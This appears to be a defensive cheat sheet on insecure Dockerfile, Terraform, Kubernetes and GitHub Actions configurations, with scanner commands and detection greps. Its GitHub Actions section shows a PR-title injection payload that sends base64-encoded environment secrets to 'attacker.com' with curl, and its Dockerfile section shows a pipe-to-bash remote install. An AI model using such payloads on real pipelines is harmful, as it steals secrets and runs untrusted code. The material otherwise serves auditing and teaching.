# IaC & Misconfiguration — Dockerfile / Terraform / K8s / CI/CD

## Dockerfile Security

### Critical Issues
```dockerfile
# CRITICAL: Running as root
# Missing: USER directive
FROM ubuntu:20.04
RUN apt-get install -y nginx
# No USER → runs as root

# CRITICAL: Hardcoded secrets in ENV
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Visible in: docker inspect, image layers, docker history

# HIGH: Privileged flag (in docker-compose.yml)
services:
  app:
    privileged: true            # Full host access!

# HIGH: Unvalidated COPY
COPY . .                        # Copies .env, secrets, keys!

# HIGH: Remote code execution during build
RUN curl https://external.com/install.sh | bash

# MEDIUM: Unpinned base image (supply chain)
FROM python:latest              # Could change anytime
FROM node:alpine                # Should be: node:18-alpine@sha256:...

# MEDIUM: Unused EXPOSE ports
EXPOSE 22                       # SSH exposed unnecessarily
```

### Audit Commands
```bash
# Hadolint (Dockerfile linter)
hadolint Dockerfile
docker run --rm -i hadolint/hadolint < Dockerfile

# Trivy for container images
trivy image TARGET/myapp:latest --severity HIGH,CRITICAL
trivy image --format json TARGET/myapp:latest | jq '.Results[].Vulnerabilities[]'

# Dive - inspect layers for secrets
dive TARGET/myapp:latest

# Docker history for secrets in layers
docker history --no-trunc TARGET/myapp:latest | grep -i "ENV\|ARG\|RUN"

# Check for sensitive data in image
docker run --rm TARGET/myapp:latest sh -c "find / -name '*.key' -o -name '.env' 2>/dev/null"
```

---

## Terraform / AWS CloudFormation

### Critical Issues
```hcl
# CRITICAL: Public S3 bucket
resource "aws_s3_bucket" "data" {
  bucket = "company-data"
  acl    = "public-read"       # DANGEROUS: world-readable!
}

# CRITICAL: Security group open to world
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]  # SSH open to entire internet!
}

# CRITICAL: IAM wildcard permissions
resource "aws_iam_role_policy" "lambda_policy" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = ["*"]          # Full AWS access!
      Resource = ["*"]
    }]
  })
}

# HIGH: Unencrypted S3 bucket
resource "aws_s3_bucket" "data" {
  # Missing: server_side_encryption_configuration block
}

# HIGH: RDS publicly accessible
resource "aws_db_instance" "db" {
  publicly_accessible = true    # DB on public internet!
  # Also check: skip_final_snapshot = true
}

# HIGH: Hardcoded secrets in .tfvars
db_password = "SuperSecretP@ss!"
aws_secret_key = "wJalrXUtnFEMI..."

# HIGH: EBS volume unencrypted
resource "aws_instance" "server" {
  # Missing: ebs_optimized, encrypted block device mapping
}

# MEDIUM: CloudTrail disabled
# Missing: aws_cloudtrail resource → no audit logs

# MEDIUM: MFA delete disabled on S3
resource "aws_s3_bucket_versioning" "v" {
  versioning_configuration {
    status     = "Enabled"
    # Missing: mfa_delete = "Enabled"
  }
}
```

### Tools
```bash
# Checkov — IaC scanner
checkov -d . --framework terraform --output json
checkov -d . --framework cloudformation
checkov -d . --framework dockerfile

# tfsec
tfsec . --format json --severity HIGH

# Terrascan
terrascan scan -t aws -d ./

# Semgrep for Terraform
semgrep --config=p/terraform .
```

---

## Kubernetes Security

### RBAC & Privilege Issues
```yaml
# CRITICAL: ClusterAdmin role binding to service account
kind: ClusterRoleBinding
metadata:
  name: my-app-binding
subjects:
  - kind: ServiceAccount
    name: my-app
roleRef:
  kind: ClusterRole
  name: cluster-admin      # Full cluster control!

# CRITICAL: Wildcard permissions
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]            # Can do ANYTHING

# HIGH: Privileged container
securityContext:
  privileged: true          # Full host access = container escape!

# HIGH: HostPath mount
volumes:
  - name: host
    hostPath:
      path: /               # Mounts entire host filesystem!

# HIGH: Secrets in env vars (base64 encoded, not encrypted)
env:
  - name: DB_PASSWORD
    value: "plaintext-here" # Not using secretKeyRef!

# HIGH: Missing resource limits (DoS vector)
containers:
  - name: app
    # Missing: resources.limits.cpu, resources.limits.memory

# MEDIUM: Running as root
securityContext:
  runAsUser: 0              # Running as root
  # Should be: runAsNonRoot: true
```

### Audit Commands
```bash
# kube-score
kube-score score deployment.yaml
kube-score score *.yaml

# kubesec
kubesec scan deployment.yaml
docker run -i kubesec/kubesec:v2 scan /dev/stdin < deployment.yaml

# kubectl audit
kubectl auth can-i --list --namespace=default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'

# Find secrets in plaintext
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | {name: .metadata.name, data: .data}' | \
  jq 'if .data then .data | to_entries[] | {(.key): (.value | @base64d)} else empty end'

# Check for privileged pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
```

---

## GitHub Actions Deep Audit

### Critical Vulnerability Patterns
```yaml
# CRITICAL: pull_request_target + untrusted input in run step
on: pull_request_target          # Fork PRs get WRITE token + secrets!
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.pull_request.title }}"  # INJECTION!
          # Attacker PR title: foo"; curl attacker.com -d $(env|base64); echo "

# CRITICAL: Script injection via event data
- run: |
    export PR_TITLE="${{ github.event.pull_request.title }}"
    # Even assignment can be dangerous in certain shells

# HIGH: Unpinned external action (supply chain)
uses: actions/checkout@v3       # Can change → use SHA instead:
uses: actions/checkout@ac593985621da5abb1923e231f7e44571731da67

# HIGH: Overly permissive token
permissions: write-all

# HIGH: Secrets in non-secret env vars
env:
  API_KEY: ${{ vars.API_KEY }}   # vars (not secrets) are less protected
  
# HIGH: GITHUB_TOKEN with excessive perms
permissions:
  contents: write                 # Can push to repo
  pull-requests: write            # Can approve PRs
  packages: write                 # Can push to registry

# MEDIUM: Workflow doesn't validate actor
# Missing: if: github.actor == 'trusted-user'

# MEDIUM: Cache poisoning vector
- uses: actions/cache@v3
  with:
    key: ${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    # If attacker can modify package-lock.json → poison cache
```

### Detection Script
```bash
# Find all workflows with pull_request_target + run steps
grep -rl "pull_request_target" .github/workflows/ | while read f; do
  echo "=== $f ==="
  grep -n "pull_request_target\|github\.event\|run:" "$f"
done

# Find unpinned actions (not using SHA)
grep -rn "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}" | grep -v "actions/"

# Find hardcoded secrets (not using ${{ secrets.xxx }})
grep -rn "env:" .github/workflows/ -A5 | grep -vE "secrets\.\|GITHUB_TOKEN\|context\." | \
  grep -iE "(password|key|token|secret|api)"

# GitHub Actions injection checker
# Look for patterns like: ${{ github.event.*.body/title/description }}
grep -rn "\${{ github.event\." .github/workflows/ | \
  grep -iE "title|body|description|head_ref|base_ref|comment"
```
